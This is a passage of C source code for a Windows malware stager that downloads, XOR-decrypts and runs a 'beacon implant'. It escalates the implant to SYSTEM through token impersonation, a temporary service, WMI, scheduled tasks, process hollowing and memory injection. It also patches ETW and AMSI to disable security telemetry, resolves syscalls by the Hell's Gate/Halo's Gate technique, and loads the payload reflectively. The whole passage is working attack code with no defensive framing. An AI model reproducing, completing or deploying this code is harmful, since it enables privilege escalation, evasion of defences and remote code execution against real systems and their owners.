    BOOL bSuccess = FALSE;
    if (CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | CREATE_BREAKAWAY_FROM_JOB,
            NULL,
            NULL,
            &si,
            &pi)) {
        HANDLE hCandidate = OpenProcess(
            SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
            FALSE,
            pi.dwProcessId
        );
        if (hCandidate) {
            bSuccess = ValidateSystemProcessStartup(hCandidate, pi.dwProcessId, STAGE2_SPAWN_STABLE_MS);
            if (!bSuccess) {
                LOGV("[-] Direct impersonated CreateProcess is not a validated SYSTEM startup (pid %lu)\n", pi.dwProcessId);
            }
            if (bSuccess) {
                gBeaconImplantPid = pi.dwProcessId;
            }
            CloseHandle(hCandidate);
        } else {
            LOGV("[-] Direct impersonated CreateProcess returned handle but process not opened for validation (pid %lu)\n", pi.dwProcessId);
        }
        if (!bSuccess) {
            TerminateProcessIfNotStrict(pi.hProcess, 1);
        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        LOGV("[-] Impersonated direct CreateProcess failed (%lu)\n", GetLastError());
    }

    RevertToSelf();
    CloseHandle(hImpersonationToken);
    if (bSuccess) {
        Sleep(STAGE2_SPAWN_STABLE_MS);
    } else {
        Sleep(500);
    }

    DeleteFileA(tempExePath);
    return bSuccess;
}

static BOOL LaunchViaLocalSystemService(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    if (!STAGE_ALLOW_DISK_STAGED_EXECUTION) {
        LOGV("[-] Disk-backed SYSTEM service launch is disabled by build configuration.\n");
        return FALSE;
    }

    char tempExePath[MAX_PATH] = { 0 };
    if (!WriteStage2SystemTempExecutable(pBeacon, dwBeaconSize, tempExePath)) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    SC_HANDLE hServiceManager = NULL;
    SC_HANDLE hService = NULL;

    char serviceName[MAX_PATH] = { 0 };
    char serviceDisplayName[128] = { 0 };
    if (_snprintf(
            serviceName,
            MAX_PATH,
            "%s_%lu_%lu",
            STAGE_SYSTEM_LOCAL_SERVICE_NAME_PREFIX,
            GetCurrentProcessId(),
            GetTickCount()
        ) < 0) {
        LOGV("[-] Failed to build local service name.\n");
        CloseServiceHandle(hServiceManager);
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    if (_snprintf(
            serviceDisplayName,
            sizeof(serviceDisplayName),
            "%s (%lu)",
            STAGE_SYSTEM_LOCAL_SERVICE_DISPLAY_PREFIX,
            GetTickCount()
        ) < 0) {
        LOGV("[-] Failed to build local service display name.\n");
        CloseServiceHandle(hServiceManager);
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
        DeleteFileA(tempExePath);
        return FALSE;
    }

    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] Failed to set thread token for LocalSystem service launch (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    hServiceManager = OpenSCManagerA(
        NULL,
        NULL,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT
    );
    if (!hServiceManager) {
        LOGV("[-] OpenSCManagerA failed for local service fallback (%lu)\n", GetLastError());
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    char serviceCommand[MAX_PATH * 2] = { 0 };
    if (_snprintf(serviceCommand, sizeof(serviceCommand), "\"%s\"", tempExePath) < 0) {
        LOGV("[-] Failed to build service command string.\n");
        CloseServiceHandle(hServiceManager);
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    hService = CreateServiceA(
        hServiceManager,
        serviceName,
        serviceDisplayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        serviceCommand,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );
    if (!hService) {
        DWORD createErr = GetLastError();
        LOGV("[-] CreateServiceA failed for LocalSystem fallback (%lu)\n", createErr);
        CloseServiceHandle(hServiceManager);
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    DWORD dwSpawnPid = 0;
    BOOL bSuccess = FALSE;
    SERVICE_STATUS_PROCESS ssp = { 0 };
    DWORD bytesNeeded = 0;

    if (!StartServiceA(hService, 0, NULL)) {
        DWORD startErr = GetLastError();
        LOGV("[-] StartServiceA failed for %s (%lu)\n", serviceName, startErr);
        DeleteService(hService);
        CloseServiceHandle(hService);
        CloseServiceHandle(hServiceManager);
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    DWORD waitStartMs = STAGE2_SPAWN_STARTUP_TIMEOUT_MS;
    DWORD waitStart = GetTickCount();
    do {
        ZeroMemory(&ssp, sizeof(ssp));
        if (!QueryServiceStatusEx(
                hService,
                SC_STATUS_PROCESS_INFO,
                (LPBYTE)&ssp,
                sizeof(ssp),
                &bytesNeeded)) {
            LOGV("[-] QueryServiceStatusEx failed while waiting for service startup (%lu)\n", GetLastError());
            break;
        }

        if (ssp.dwCurrentState == SERVICE_RUNNING && ssp.dwProcessId != 0) {
            dwSpawnPid = ssp.dwProcessId;
            break;
        }

        if (ssp.dwCurrentState == SERVICE_STOPPED ||
            ssp.dwCurrentState == SERVICE_STOP_PENDING ||
            ssp.dwCurrentState == SERVICE_PAUSED) {
            LOGV("[-] Service %s entered non-running state %lu\n", serviceName, ssp.dwCurrentState);
            break;
        }

        Sleep(150);
    } while ((DWORD)(GetTickCount() - waitStart) < waitStartMs);

    if (dwSpawnPid) {
        HANDLE hCandidate = OpenProcess(
            SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
            FALSE,
            dwSpawnPid
        );
        if (hCandidate) {
            DWORD verifyErr = ERROR_SUCCESS;
            if (!IsProcessTokenSystem(hCandidate, dwSpawnPid, &verifyErr)) {
                LOGV("[-] Service-launched process is not SYSTEM (pid %lu, verify err=%lu)\n", dwSpawnPid, verifyErr);
            } else if (ValidateChildProcessStartup(hCandidate, STAGE2_STARTUP_TIMEOUT_MS)) {
                bSuccess = TRUE;
            } else {
                LOGV("[-] Service-launched process failed startup validation (pid %lu)\n", dwSpawnPid);
            }
            CloseHandle(hCandidate);
        } else {
            LOGV("[-] Service started with pid %lu but process handle could not be opened (%lu)\n", dwSpawnPid, GetLastError());
        }
    } else {
        LOGV("[-] Service fallback did not surface a running process within timeout\n");
    }

    if (!bSuccess) {
        SERVICE_STATUS serviceStatus = { 0 };
        if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
            QueryServiceStatus(hService, &serviceStatus);
        }
    }

    DeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hServiceManager);
    RevertToSelf();
    CloseHandle(hImpersonationToken);

    if (bSuccess) {
        gBeaconImplantPid = dwSpawnPid;
        LOGV("[+] Stage2 launched via LocalSystem service (PID %lu)\n", dwSpawnPid);
        Sleep(STAGE2_STARTUP_TIMEOUT_MS);
    } else {
        Sleep(500);
    }

    if (!DeleteFileA(tempExePath)) {
        DWORD delErr = GetLastError();
        if (delErr == ERROR_SHARING_VIOLATION) {
            MoveFileExA(tempExePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }

    return bSuccess;
}

// ============================================================================
// STAGE2 EXECUTION: SYSTEM CONTEXT (SEPARATE PROCESS)
// ============================================================================

static BOOL RunReflectiveStage2AsSystem(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    HANDLE hImpersonationToken = NULL;
    gBeaconImplantPid = 0;
    if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
        LOGV("[-] Failed to duplicate SYSTEM token for in-process reflective execution\n");
        return FALSE;
    }

    BOOL bSuccess = FALSE;
    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] Failed to set SYSTEM thread token for in-process execution (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        return FALSE;
    }

    bSuccess = ReflectiveLoadPE(pBeacon, dwBeaconSize);
    RevertToSelf();
    CloseHandle(hImpersonationToken);
    return bSuccess;
}

static BOOL RunStage2AsSystem(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    LOGE("[*] SYSTEM launch chain entry: strict=%d, hollowing=%d, disk_backed=%d, process_reflective_fallback=%d\n",
        IsStrictSystemMode(), STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED, STAGE_ALLOW_DISK_STAGED_EXECUTION, STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK);
    LOGV("[*] Attempting SYSTEM process launch path...\n");
    LOGE("[*] Attempting SYSTEM process launch path...\n");

    const BOOL bPayloadIsPe = IsValidPePayload(pBeacon, dwBeaconSize);
    const BOOL bStrictSystemMode = IsStrictSystemMode();
    const BOOL bPreferNoDiskForPe =
        bPayloadIsPe && STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED;
    const BOOL bDiskBackedAllowed = STAGE_ALLOW_DISK_STAGED_EXECUTION != 0 && !bStrictSystemMode && !bPreferNoDiskForPe;
    DWORD currentSession = (DWORD)-1;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &currentSession)) {
        currentSession = 0;
    }

    HANDLE hPreparedSystemToken = NULL;
    BOOL bPreparedToken = PrepareSystemToken(hSystemToken, &hPreparedSystemToken, currentSession);
    if (!bPreparedToken) {
        LOGE("[-] Failed to prepare SYSTEM token for launch; falling back to acquired token.\n");
        LOGV("[-] Failed to prepare SYSTEM token for launch; falling back to acquired token.\n");
        hPreparedSystemToken = hSystemToken;
    }

    if (!EnableSystemProcessPrivileges()) {
        LOGE("[-] Cannot enable SYSTEM process-creation privileges for current process (may still work if privileges are pre-assigned)\n");
        LOGV("[-] Cannot enable SYSTEM process-creation privileges for current process (may still work if privileges are pre-assigned)\n");
    }

    BOOL bSuccess = FALSE;

    if (!bPayloadIsPe) {
        LOGE("[+] Attempting non-PE SYSTEM memory launch path first.\n");
        LOGV("[+] Attempting non-PE SYSTEM memory launch path first.\n");
        if (InjectIntoSystemProcessMemoryOnly(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via memory injection\n");
            LOGV("[+] SYSTEM execution successful via memory injection\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] Memory-only SYSTEM execution failed; falling back to disk/system-process paths.\n");
        LOGV("[-] Memory-only SYSTEM execution failed; falling back to disk/system-process paths.\n");
    }

    if (!bSuccess && !bPayloadIsPe && STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED) {
        LOGE("[*] Skipping process hollowing for non-PE payload.\n");
        LOGV("[*] Skipping process hollowing for non-PE payload.\n");
    }

    if (!bSuccess && STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED && bPayloadIsPe) {
        LOGE("[*] SYSTEM process hollowing attempt is enabled, trying hollowing path as primary.\n");
        LOGV("[*] SYSTEM process hollowing attempt is enabled, trying hollowing path as primary.\n");
        if (HollowLegitimateSystemProcess(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via process hollowing\n");
            LOGV("[+] SYSTEM execution successful via process hollowing\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] Process hollowing attempt failed or not applicable for current payload.\n");
        LOGV("[-] Process hollowing attempt failed or not applicable for current payload.\n");
    }

    if (bDiskBackedAllowed) {
        LOGE("[-] Trying direct SYSTEM CreateProcess with primary token...\n");
        LOGV("[-] Trying direct SYSTEM CreateProcess with primary token...\n");
        if (LaunchViaCreateProcessToken(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via direct SYSTEM CreateProcess (primary token)\n");
            LOGV("[+] SYSTEM execution successful via direct SYSTEM CreateProcess (primary token)\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] Primary-token CreateProcess failed, trying impersonated SYSTEM CreateProcess...\n");
        LOGV("[-] Primary-token CreateProcess failed, trying impersonated SYSTEM CreateProcess...\n");

        if (LaunchViaCreateProcessImpersonated(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via direct impersonated CreateProcess\n");
            LOGV("[+] SYSTEM execution successful via direct impersonated CreateProcess\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] Impersonated CreateProcess failed, trying WMI...");
        LOGV("[-] Impersonated CreateProcess failed, trying WMI...");

        if (LaunchViaWMI(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via WMI\n");
            LOGV("[+] SYSTEM execution successful via WMI\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] WMI launch failed, trying Task Scheduler...");
        LOGV("[-] WMI launch failed, trying Task Scheduler...");

        if (LaunchViaScheduledTask(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via Task Scheduler\n");
            LOGV("[+] SYSTEM execution successful via Task Scheduler\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] Task Scheduler launch failed");
        LOGV("[-] Task Scheduler launch failed");

        if (STAGE_SYSTEM_LOCAL_SERVICE_LAUNCH) {
            if (LaunchViaLocalSystemService(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
                LOGE("[+] SYSTEM execution successful via LocalSystem service\n");
                LOGV("[+] SYSTEM execution successful via LocalSystem service\n");
                bSuccess = TRUE;
                goto done;
            }
            LOGE("[-] LocalSystem service path did not launch beacon.\n");
            LOGV("[-] LocalSystem service path did not launch beacon.\n");
        }
    }

    if (STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK && !bSuccess) {
        LOGE("[+] SYSTEM reflective in-process fallback enabled, attempting reflective execution.\n");
        LOGV("[+] SYSTEM reflective in-process fallback enabled, attempting reflective execution.\n");
        if (RunReflectiveStage2AsSystem(hPreparedSystemToken, pBeacon, dwBeaconSize)) {
            LOGE("[+] SYSTEM execution successful via in-process reflective load.\n");
            LOGV("[+] SYSTEM execution successful via in-process reflective load.\n");
            bSuccess = TRUE;
            goto done;
        }
        LOGE("[-] In-process reflective SYSTEM execution failed.\n");
        LOGV("[-] In-process reflective SYSTEM execution failed.\n");
    }

    if (!bSuccess) {
        if (!bDiskBackedAllowed) {
            LOGE("[-] Disk-backed SYSTEM launch paths were disabled for this build/session.\n");
            LOGV("[-] Disk-backed SYSTEM launch paths were disabled for this build/session.\n");
        } else {
            LOGE("[-] SYSTEM execution via disk-backed fallbacks was not available.\n");
            LOGV("[-] SYSTEM execution via disk-backed fallbacks was not available.\n");
        }
        LOGE("[-] SYSTEM mode requested but all SYSTEM execution and fallback paths failed.\n");
    }

done:
    if (bPreparedToken) {
        CloseHandle(hPreparedSystemToken);
    }
    return bSuccess;
}

// HELL'S GATE / HALO'S GATE
// ============================================================================

WORD GetSyscallNumber(PVOID pFunctionAddress) {
    BYTE* pFunction = (BYTE*)pFunctionAddress;
    
    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && 
        pFunction[2] == 0xD1 && pFunction[3] == 0xB8) {
        return *(WORD*)(pFunction + 4);
    }
    
    for (int i = 1; i <= 10; i++) {
        BYTE* pDown = pFunction + (i * 0x20);
        if (pDown[0] == 0x4C && pDown[1] == 0x8B && 
            pDown[2] == 0xD1 && pDown[3] == 0xB8) {
            return *(WORD*)(pDown + 4) - i;
        }
        
        BYTE* pUp = pFunction - (i * 0x20);
        if (pUp[0] == 0x4C && pUp[1] == 0x8B && 
            pUp[2] == 0xD1 && pUp[3] == 0xB8) {
            return *(WORD*)(pUp + 4) + i;
        }
    }

    return 0;
}

BOOL InitializeVxTable(PVX_TABLE pVxTable) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    NT_SYSCALL_INIT entries[] = {
        { "NtAllocateVirtualMemory", &pVxTable->NtAllocateVirtualMemory.pAddress, &pVxTable->NtAllocateVirtualMemory.wSystemCall },
        { "NtProtectVirtualMemory",  &pVxTable->NtProtectVirtualMemory.pAddress,  &pVxTable->NtProtectVirtualMemory.wSystemCall  },
        { "NtCreateThreadEx",        &pVxTable->NtCreateThreadEx.pAddress,        &pVxTable->NtCreateThreadEx.wSystemCall        },
        { "NtWaitForSingleObject",   &pVxTable->NtWaitForSingleObject.pAddress,   &pVxTable->NtWaitForSingleObject.wSystemCall   },
    };

    for (size_t i = 0; i < STAGE_ARRAY_COUNT(entries); i++) {
        PVOID pProc = (PVOID)(void*)GetProcAddress(hNtdll, entries[i].lpName);
        if (!pProc) {
            return FALSE;
        }
        
        *entries[i].ppAddress = pProc;
        *entries[i].pwSystemCall = GetSyscallNumber(pProc);
    }
    
    return TRUE;
}

// ============================================================================
// ETW & AMSI PATCHING
// ============================================================================

BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    PVOID pEtwEventWrite = (PVOID)(void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;
    
    DWORD dwOldProtect;
    BYTE patch[1] = { 0xC3 };
    
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;
    
    memcpy(pEtwEventWrite, patch, 1);
    VirtualProtect(pEtwEventWrite, 1, dwOldProtect, &dwOldProtect);
    return TRUE;
}

BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE;
    
    PVOID pAmsiScanBuffer = (PVOID)(void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;
    
    DWORD dwOldProtect;
    BYTE patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    if (!VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;
    
    memcpy(pAmsiScanBuffer, patch, 6);
    VirtualProtect(pAmsiScanBuffer, 6, dwOldProtect, &dwOldProtect);
    return TRUE;
}

// ============================================================================
// STAGE 2 DOWNLOADER
// ============================================================================

static BOOL HasInternetConnectivity() {
    DWORD dwFlags = 0;
    if (!InternetGetConnectedState(&dwFlags, 0)) {
        LOGV("[-] InternetGetConnectedState failed before Stage2 download (flags=0x%08lX)\n", dwFlags);
        return FALSE;
    }

    return TRUE;
}

PBYTE DownloadStage2(LPCSTR lpUrl, PDWORD pdwSize) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    PBYTE pBuffer = NULL;
    DWORD dwBytesRead = 0;
    DWORD dwTotalBytes = 0;
    DWORD dwBufferSize = 1024 * 1024;
    DWORD dwTimeoutMs = 10000;
    
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; Win64; x64)", 
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    
    if (!hInternet) return NULL;

    if (!HasInternetConnectivity()) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &dwTimeoutMs, sizeof(dwTimeoutMs));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &dwTimeoutMs, sizeof(dwTimeoutMs));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &dwTimeoutMs, sizeof(dwTimeoutMs));

    LOGV("[*] Downloading stage2 from %s\n", lpUrl);
    
    hConnect = InternetOpenUrlA(hInternet, lpUrl, NULL, 0, 
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    if (!hConnect) {
        LOGV("[-] InternetOpenUrlA failed for %s (%lu)\n", lpUrl, GetLastError());
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    pBuffer = (PBYTE)VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuffer) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    while (1) {
        BOOL bRead = InternetReadFile(hConnect, pBuffer + dwTotalBytes, 4096, &dwBytesRead);
        if (!bRead) {
            LOGV("[-] InternetReadFile failed for %s at offset %lu (error %lu)\n", lpUrl, dwTotalBytes, GetLastError());
            if (dwTotalBytes == 0) {
                VirtualFree(pBuffer, 0, MEM_RELEASE);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return NULL;
            }
            break;
        }

        if (dwBytesRead == 0) {
            break;
        }

        dwTotalBytes += dwBytesRead;
        
        if (dwTotalBytes + 4096 > dwBufferSize) {
            dwBufferSize *= 2;
            PBYTE pNewBuffer = (PBYTE)VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!pNewBuffer) {
                VirtualFree(pBuffer, 0, MEM_RELEASE);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return NULL;
            }
            memcpy(pNewBuffer, pBuffer, dwTotalBytes);
            VirtualFree(pBuffer, 0, MEM_RELEASE);
            pBuffer = pNewBuffer;
        }
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (dwTotalBytes == 0) {
        LOGV("[-] Stage2 download returned zero bytes from %s\n", lpUrl);
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        return NULL;
    }
    
    *pdwSize = dwTotalBytes;
    return pBuffer;
}

// ============================================================================
// XOR DECRYPTION
// ============================================================================

VOID XorEncryptDecrypt(PBYTE pData, SIZE_T size, PBYTE key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= key[i % keyLen];
    }
}

BOOL DecodeStage2Payload(PBYTE pDownloadedData, DWORD dwDownloadedSize,
    PBYTE* ppStage2, DWORD* pdwStage2Size, BYTE defaultXorKey[STAGER_DEFAULT_KEY_LEN],
    BOOL* pbAllocated) {
    
    if (!pDownloadedData || !ppStage2 || !pdwStage2Size || !pbAllocated || !defaultXorKey)
        return FALSE;

    *ppStage2 = pDownloadedData;
    *pdwStage2Size = dwDownloadedSize;
    *pbAllocated = FALSE;

    if (dwDownloadedSize < sizeof(WORD))
        return FALSE;

    // New format: SLVRSTG1 + key length + key + pad length + encrypted payload
    if (dwDownloadedSize >= STAGER_MAGIC_LEN &&
        memcmp(pDownloadedData, STAGER_MAGIC, STAGER_MAGIC_LEN) == 0) {
        
        if (dwDownloadedSize < STAGER_MAGIC_LEN + 1)
            return FALSE;

        DWORD keyLen = pDownloadedData[STAGER_MAGIC_LEN];
        if (keyLen == 0 || keyLen > STAGER_DEFAULT_KEY_LEN)
            return FALSE;

        if (dwDownloadedSize < STAGER_MAGIC_LEN + 1 + keyLen + sizeof(DWORD))
            return FALSE;

        DWORD padLen = 0;
        memcpy(&padLen, &pDownloadedData[STAGER_MAGIC_LEN + 1 + keyLen], sizeof(DWORD));
        DWORD payloadOffset = STAGER_MAGIC_LEN + 1 + keyLen + sizeof(DWORD);

        if (payloadOffset >= dwDownloadedSize)
            return FALSE;

        DWORD encryptedPayloadSize = dwDownloadedSize - payloadOffset;
        if (padLen > encryptedPayloadSize)
            return FALSE;

        PBYTE pPayloadBuffer = (PBYTE)VirtualAlloc(NULL, encryptedPayloadSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!pPayloadBuffer)
            return FALSE;

        memcpy(pPayloadBuffer, pDownloadedData + payloadOffset, encryptedPayloadSize);

        BYTE derivedKey[STAGER_DEFAULT_KEY_LEN] = { 0 };
        memcpy(derivedKey, pDownloadedData + STAGER_MAGIC_LEN + 1, keyLen);
        XorEncryptDecrypt(pPayloadBuffer, encryptedPayloadSize, derivedKey, keyLen);

        *ppStage2 = pPayloadBuffer;
        *pdwStage2Size = encryptedPayloadSize - padLen;
        *pbAllocated = TRUE;

        if (*pdwStage2Size < sizeof(WORD) || *(PWORD)pPayloadBuffer != IMAGE_DOS_SIGNATURE)
            return FALSE;

        return TRUE;
    }

    // Backward-compatible: XOR-encrypted payload
    if (*(PWORD)pDownloadedData != IMAGE_DOS_SIGNATURE) {
        XorEncryptDecrypt(pDownloadedData, dwDownloadedSize, defaultXorKey, STAGER_DEFAULT_KEY_LEN);
    }

    if (*(PWORD)pDownloadedData != IMAGE_DOS_SIGNATURE)
        return FALSE;

    return TRUE;
}

// ============================================================================
// REFLECTIVE PE LOADER (Preserved from original)
// ============================================================================

typedef BOOL(WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);
typedef int (WINAPI* ExeEntry_t)(HINSTANCE, HINSTANCE, LPSTR, int);

static BOOL ReflectiveLoadPE(PBYTE pPEBuffer, SIZE_T peSize) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPEBuffer;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pPEBuffer + pDosHeader->e_lfanew);
    
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return FALSE;
    
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    PVOID pImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!pImageBase) return FALSE;
    
    memcpy(pImageBase, pPEBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);
    
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        PVOID pSectionDest = (PBYTE)pImageBase + pSection->VirtualAddress;
        PVOID pSectionSrc = pPEBuffer + pSection->PointerToRawData;
        memcpy(pSectionDest, pSectionSrc, pSection->SizeOfRawData);
    }
    
    DWORD_PTR delta = (DWORD_PTR)pImageBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (pRelocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pImageBase + pRelocDir->VirtualAddress);
            
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pRelocData = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                
                for (DWORD i = 0; i < count; i++) {
                    if ((pRelocData[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        PDWORD_PTR pAddress = (PDWORD_PTR)((PBYTE)pImageBase + pReloc->VirtualAddress + (pRelocData[i] & 0xFFF));
                        *pAddress += delta;
                    }
                }
                
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }
    
    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + pImportDir->VirtualAddress);
        
        while (pImport->Name != 0) {
            LPCSTR pLibName = (LPCSTR)((PBYTE)pImageBase + pImport->Name);
            HMODULE hLib = LoadLibraryA(pLibName);
            
            if (hLib) {
                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->FirstThunk);
                PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase +
                    (pImport->OriginalFirstThunk ? pImport->OriginalFirstThunk : pImport->FirstThunk));
                
                while (pOrigThunk->u1.AddressOfData != 0) {
                    if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                        pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hLib,
                            MAKEINTRESOURCEA((WORD)(pOrigThunk->u1.Ordinal & 0xFFFF)));
                    } else {
                        PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pOrigThunk->u1.AddressOfData);
                        pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hLib, pImportName->Name);
                    }
                    pThunk++;
                    pOrigThunk++;
                }
            }
            pImport++;
        }
    }
    
    pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        DWORD dwProtect = PAGE_READONLY;
        
        if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE)
                dwProtect = PAGE_EXECUTE_READWRITE;
            else
                dwProtect = PAGE_EXECUTE_READ;
        } else if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) {
            dwProtect = PAGE_READWRITE;
        }
        
        DWORD dwOld;
        VirtualProtect((PBYTE)pImageBase + pSection->VirtualAddress, pSection->Misc.VirtualSize, dwProtect, &dwOld);
    }
    
